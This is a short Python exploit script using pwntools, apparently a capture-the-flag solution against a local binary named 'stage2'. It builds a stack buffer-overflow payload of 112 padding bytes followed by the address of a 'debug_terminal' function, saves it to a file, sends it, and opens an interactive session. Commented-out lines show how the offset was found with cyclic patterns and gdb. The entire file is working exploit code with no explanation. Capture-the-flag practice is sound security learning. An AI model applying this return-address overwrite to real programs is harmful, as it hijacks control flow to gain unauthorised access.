#!/usr/bin/env python3

from pwn import *
from pprint import pprint

elf = ELF("./stage2")

addr_debugterminal = elf.symbols["debug_terminal"]
print(hex(addr_debugterminal))
p = elf.process()

#gdb.attach(p, '''
#continue
#''')

print(p.recvline()) # welcome
#p.sendline(cyclic(200))
#p.sendline(cyclic(200))
#p.sendline(b"A"*112 + b"B"*4)
#p.sendline(b"A"*112 + p32(addr))
#p.sendline(cyclic(112) + p32(addr))
payload = b"A"*112 + p32(addr_debugterminal)
with open('x', 'wb') as f:
    f.write(payload)
p.sendline(payload)

#print(p.recvall())
p.interactive()

